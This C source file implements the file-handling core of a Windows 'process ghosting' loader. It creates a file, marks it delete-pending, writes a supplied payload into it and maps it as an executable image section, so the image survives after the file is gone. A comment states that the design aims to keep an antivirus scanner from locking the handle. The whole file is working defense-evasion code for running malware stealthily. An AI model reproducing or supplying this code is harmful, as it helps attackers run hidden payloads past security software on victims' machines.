#include "delete_pending_file.h"
#include <stdio.h>
#include <ntstatus.h>

/* NT API declarations */
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define OBJ_CASE_INSENSITIVE 0x00000040L
#define SEC_IMAGE 0x01000000
#define FILE_SUPERSEDE 0x00000000
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#define FileDispositionInformation 13
#define SECTION_ALL_ACCESS 0xF001F

typedef long NTSTATUS;

typedef struct _UNICODE_STRING {
    unsigned short Length;
    unsigned short MaximumLength;
    wchar_t *Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    unsigned long Length;
    void *RootDirectory;
    PUNICODE_STRING ObjectName;
    unsigned long Attributes;
    void *SecurityDescriptor;
    void *SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK {
    union {
        long Status;
        void *Pointer;
    };
    unsigned long Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef struct _FILE_DISPOSITION_INFORMATION {
    int DeleteFile;
} FILE_DISPOSITION_INFORMATION, *PFILE_DISPOSITION_INFORMATION;

/* NT API function pointers */
typedef long(NTAPI *pNtCreateFile)(
    void **FileHandle,
    unsigned long DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    unsigned long FileAttributes,
    unsigned long ShareAccess,
    unsigned long CreateDisposition,
    unsigned long CreateOptions,
    void *EaBuffer,
    unsigned long EaLength
);

typedef long(NTAPI *pNtWriteFile)(
    void *FileHandle,
    void *Event,
    void *ApcRoutine,
    void *ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    void *Buffer,
    unsigned long Length,
    PLARGE_INTEGER ByteOffset,
    unsigned long *Key
);

typedef long(NTAPI *pNtSetInformationFile)(
    void *FileHandle,
    PIO_STATUS_BLOCK IoStatusBlock,
    void *FileInformation,
    unsigned long Length,
    unsigned long FileInformationClass
);

typedef long(NTAPI *pNtCreateSection)(
    void **SectionHandle,
    unsigned long DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    unsigned long SectionPageProtection,
    unsigned long AllocationAttributes,
    void *FileHandle
);

typedef long(NTAPI *pNtClose)(void *Handle);

/* Load NT APIs at runtime */
static pNtCreateFile g_NtCreateFile = nullptr;
static pNtWriteFile g_NtWriteFile = nullptr;
static pNtSetInformationFile g_NtSetInformationFile = nullptr;
static pNtCreateSection g_NtCreateSection = nullptr;
static pNtClose g_NtClose = nullptr;

static bool load_delete_pending_apis()
{
    if (g_NtCreateFile) return true;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    g_NtCreateFile = (pNtCreateFile)GetProcAddress(hNtdll, "NtCreateFile");
    g_NtWriteFile = (pNtWriteFile)GetProcAddress(hNtdll, "NtWriteFile");
    g_NtSetInformationFile = (pNtSetInformationFile)GetProcAddress(hNtdll, "NtSetInformationFile");
    g_NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    g_NtClose = (pNtClose)GetProcAddress(hNtdll, "NtClose");

    return g_NtCreateFile && g_NtWriteFile && g_NtSetInformationFile && g_NtCreateSection && g_NtClose;
}

HANDLE open_file(wchar_t* filePath)
{
    if (!load_delete_pending_apis()) return nullptr;

    // Convert to NT path
    wchar_t nt_path_buf[MAX_PATH * 2] = {0};
    swprintf_s(nt_path_buf, L"\\??\\%s", filePath);

    UNICODE_STRING file_name = {0};
    file_name.Buffer = nt_path_buf;
    file_name.Length = (unsigned short)(wcslen(nt_path_buf) * 2);
    file_name.MaximumLength = file_name.Length + 2;

    OBJECT_ATTRIBUTES attr = {0};
    attr.Length = sizeof(OBJECT_ATTRIBUTES);
    attr.ObjectName = &file_name;
    attr.Attributes = OBJ_CASE_INSENSITIVE;
    attr.RootDirectory = nullptr;
    attr.SecurityDescriptor = nullptr;
    attr.SecurityQualityOfService = nullptr;

    IO_STATUS_BLOCK status_block = {0};
    void *file = nullptr;

    /* Use NtCreateFile with FILE_SUPERSEDE disposition: atomically creates or replaces
       the file in a single kernel call, leaving no window between creation and our
       exclusive open for an AV scanner to lock the handle. */
    NTSTATUS stat = g_NtCreateFile(&file,
        DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE,
        &attr,
        &status_block,
        nullptr,                        /* AllocationSize */
        FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_TEMPORARY,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_SUPERSEDE,                 /* CreateDisposition: create or replace */
        FILE_SYNCHRONOUS_IO_NONALERT,   /* CreateOptions */
        nullptr, 0                      /* EaBuffer, EaLength */
    );

    if (!NT_SUCCESS(stat)) {
        fprintf(stderr, "[delete_pending_file] NtCreateFile failed: 0x%lX\n", stat);
        return nullptr;
    }

    return (HANDLE)file;
}

HANDLE make_section_from_delete_pending_file(wchar_t* filePath, BYTE* payladBuf, DWORD payloadSize)
{
    fprintf(stderr, "[delete_pending_file] make_section_from_delete_pending_file called: filePath=%p, payloadSize=%lu\n", 
           filePath, payloadSize);
    
    HANDLE hDelFile = open_file(filePath);
    if (!hDelFile) {
        fprintf(stderr, "[delete_pending_file] Failed to create file\n");
        return nullptr;
    }
    fprintf(stderr, "[delete_pending_file] File created: %p\n", hDelFile);

    IO_STATUS_BLOCK status_block = {0};

    /* Set disposition flag */
    FILE_DISPOSITION_INFORMATION info = {0};
    info.DeleteFile = TRUE;

    NTSTATUS status = g_NtSetInformationFile(hDelFile, &status_block, &info, sizeof(info), FileDispositionInformation);
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[delete_pending_file] Setting file information failed: 0x%lX\n", status);
        g_NtClose(hDelFile);
        return nullptr;
    }

    LARGE_INTEGER ByteOffset = {0};

    status = g_NtWriteFile(
        hDelFile,
        nullptr,
        nullptr,
        nullptr,
        &status_block,
        payladBuf,
        payloadSize,
        &ByteOffset,
        nullptr
    );

    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[delete_pending_file] Failed writing payload: 0x%lX\n", status);
        g_NtClose(hDelFile);
        return nullptr;
    }

    fprintf(stderr, "[delete_pending_file] Payload written (%lu bytes)\n", payloadSize);

    void *hSection = nullptr;
    fprintf(stderr, "[delete_pending_file] Calling NtCreateSection with SEC_IMAGE...\n");
    status = g_NtCreateSection(&hSection,
        SECTION_ALL_ACCESS,
        nullptr,
        nullptr,
        PAGE_READONLY,
        SEC_IMAGE,
        hDelFile
    );
    fprintf(stderr, "[delete_pending_file] NtCreateSection returned: status=0x%lX, hSection=%p\n", status, hSection);

    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[delete_pending_file] NtCreateSection failed: 0x%lX\n", status);
        g_NtClose(hDelFile);
        return nullptr;
    }

    g_NtClose(hDelFile);
    hDelFile = nullptr;

    return (HANDLE)hSection;
}
